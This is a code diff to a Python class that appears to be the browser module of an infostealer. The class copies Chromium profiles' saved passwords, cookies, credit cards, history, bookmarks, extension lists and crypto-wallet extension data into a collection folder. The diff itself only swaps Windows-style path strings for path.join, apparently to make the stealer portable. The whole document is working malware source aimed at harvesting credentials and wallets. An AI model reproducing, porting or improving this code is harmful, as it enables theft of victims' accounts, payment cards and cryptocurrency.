@@ -29,7 +29,7 @@ class Chromium:
         self.__profiles = None
 
         self.__config = ChromiumConfig()
-        self.__path = rf"{self.__storage_path}\Browsers\{self.__browser_name}"
+        self.__path = path.join(self.__storage_path, "Browsers", self.__browser_name)
 
     def _get_profiles(self) -> list:
         """
@@ -39,7 +39,7 @@ class Chromium:
         if self.__browser_path[-9:] in ["User Data"]:
 
             pattern = compile(r"Default|Profile \d+")
-            return [rf"{self.__browser_path}\{profile}" for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
+            return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
 
         return [self.__browser_path]
 
@@ -50,7 +50,7 @@ class Chromium:
         """
         if path.exists(self.__browser_path) and any(self.__statuses):
 
-            makedirs(rf"{self.__storage_path}\Browsers\{self.__browser_name}")
+            makedirs(path.join(self.__storage_path, "Browsers", self.__browser_name))
             self.__profiles = self._get_profiles()
 
     @staticmethod
@@ -167,7 +167,7 @@ class Chromium:
         :param alt_path: str
         :return: None
         """
-        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Passwords.db"
+        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Passwords.db")
 
         if self._copy_files(filename, main_path, alt_path, "No passwords found") is False:
             return
@@ -188,7 +188,7 @@ class Chromium:
             for result in passwords_list
         ]
 
-        with open(rf"{self.__path}\{profile} Passwords.txt", "a", encoding="utf-8") as passwords:
+        with open(path.join(self.__path, rf"{profile} Passwords.txt"), "a", encoding="utf-8") as passwords:
             passwords.write("".join(item for item in set(temp)))
 
         passwords.close()
@@ -201,7 +201,7 @@ class Chromium:
         :param alt_path: str
         :return: None
         """
-        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cookies.db"
+        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cookies.db")
 
         if self._copy_files(filename, main_path, alt_path, "No cookies found") is False:
             return
@@ -240,7 +240,7 @@ class Chromium:
             for result in cookies_list
         ]
 
-        with open(rf"{self.__path}\{profile} Cookies.json", "a", encoding="utf-8") as cookies:
+        with open(path.join(self.__path, rf"{profile} Cookies.json"), "a", encoding="utf-8") as cookies:
             dump(results, cookies)
 
         cookies.close()
@@ -253,7 +253,7 @@ class Chromium:
         :param alt_path: str
         :return: None
         """
-        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Cards.db"
+        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Cards.db")
 
         if self._copy_files(filename, main_path, alt_path, "No cards found") is False:
             return
@@ -274,7 +274,7 @@ class Chromium:
             for result in cards_list
         ]
 
-        with open(rf"{self.__path}\{profile} Cards.txt", "a", encoding="utf-8") as cards:
+        with open(path.join(self.__path, rf"{profile} Cards.txt"), "a", encoding="utf-8") as cards:
             cards.write("".join(item for item in set(temp)))
 
         cards.close()
@@ -287,7 +287,7 @@ class Chromium:
         :param alt_path: str
         :return: None
         """
-        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} History.db"
+        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} History.db")
 
         if self._copy_files(filename, main_path, alt_path, "No history found") is False:
             return
@@ -309,7 +309,7 @@ class Chromium:
             for result in history_list
         ]
 
-        with open(rf"{self.__path}\{profile} History.txt", "a", encoding="utf-8") as history:
+        with open(path.join(self.__path, rf"{profile} History.txt"), "a", encoding="utf-8") as history:
             history.write("".join(item for item in set(temp)))
 
         history.close()
@@ -322,7 +322,7 @@ class Chromium:
         :param alt_path: str
         :return: None
         """
-        filename = rf"{self.__storage_path}\{self.__browser_name} {profile} Bookmarks"
+        filename = path.join(self.__storage_path, rf"{self.__browser_name} {profile} Bookmarks")
 
         if self._copy_files(filename, main_path, alt_path, "No bookmarks found") is False:
             return
@@ -341,7 +341,7 @@ class Chromium:
             for result in bookmarks_list
         ]
 
-        with open(rf"{self.__path}\{profile} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
+        with open(path.join(self.__path, rf"{profile} Bookmarks.txt"), "a", encoding="utf-8") as bookmarks:
             bookmarks.write("".join(item for item in set(temp)))
 
         bookmarks.close()
@@ -361,13 +361,13 @@ class Chromium:
 
         for dirpath in extensions_dirs:
 
-            extension_dir = listdir(fr"{extension}\{dirpath}")
+            extension_dir = listdir(path.join(extension, dirpath))
 
             if len(extension_dir) == 0:
                 continue
 
             extension_dir = extension_dir[-1]
-            manifest_path = fr"{extension}\{dirpath}\{extension_dir}\manifest.json"
+            manifest_path = path.join(extension, dirpath, extension_dir, "manifest.json")
 
             with open(manifest_path, "r", encoding="utf-8") as file:
                 manifest = load(file)
@@ -378,7 +378,7 @@ class Chromium:
 
             file.close()
 
-        with open(rf"{self.__path}\{profile} Extensions.txt", "a", encoding="utf-8") as extensions:
+        with open(path.join(self.__path, rf"{profile} Extensions.txt"), "a", encoding="utf-8") as extensions:
             extensions.write("\n".join(item for item in set(extensions_list)))
 
         extensions.close()
@@ -394,8 +394,8 @@ class Chromium:
 
             try:
 
-                filename = rf'{self.__path}\{profile} {wallet["name"]}'
-                self._copy_files(filename, rf'{wallets}\{wallet["folder"]}', error="No wallets found")
+                filename = path.join(self.__path, rf'{profile} {wallet["name"]}')
+                self._copy_files(filename, path.join(wallets, wallet["folder"]), error="No wallets found")
 
             except Exception as e:
                 print(f"[{self.__browser_name}]: {repr(e)}")
@@ -410,37 +410,37 @@ class Chromium:
         functions = [
             {
                 "method": self._grab_passwords,
-                "arguments": [profile_name, rf"{profile}\Login Data", None],
+                "arguments": [profile_name, path.join(profile, "Login Data"), None],
                 "status": True if Features.passwords in self.__statuses else False
             },
             {
                 "method": self._grab_cookies,
-                "arguments": [profile_name, rf"{profile}\Cookies", rf"{profile}\Network\Cookies"],
+                "arguments": [profile_name, path.join(profile, "Cookies"), path.join(profile, "Network", "Cookies")],
                 "status": True if Features.cookies in self.__statuses else False
             },
             {
                 "method": self._grab_cards,
-                "arguments": [profile_name, rf"{profile}\Web Data", None],
+                "arguments": [profile_name, path.join(profile, "Web Data"), None],
                 "status": True if Features.cards in self.__statuses else False
             },
             {
                 "method": self._grab_history,
-                "arguments": [profile_name, rf"{profile}\History", None],
+                "arguments": [profile_name, path.join(profile, "History"), None],
                 "status": True if Features.history in self.__statuses else False
             },
             {
                 "method": self._grab_bookmarks,
-                "arguments": [profile_name, rf"{profile}\Bookmarks", None],
+                "arguments": [profile_name, path.join(profile, "Bookmarks"), None],
                 "status": True if Features.bookmarks in self.__statuses else False
             },
             {
                 "method": self._grab_extensions,
-                "arguments": [profile_name, rf"{profile}\Extensions"],
+                "arguments": [profile_name, path.join(profile, "Extensions")],
                 "status": True if Features.bookmarks in self.__statuses else False
             },
             {
                 "method": self._grab_wallets,
-                "arguments": [profile_name, rf"{profile}\Local Extension Settings"],
+                "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
                 "status": True if Features.wallets in self.__statuses else False
             }
         ]
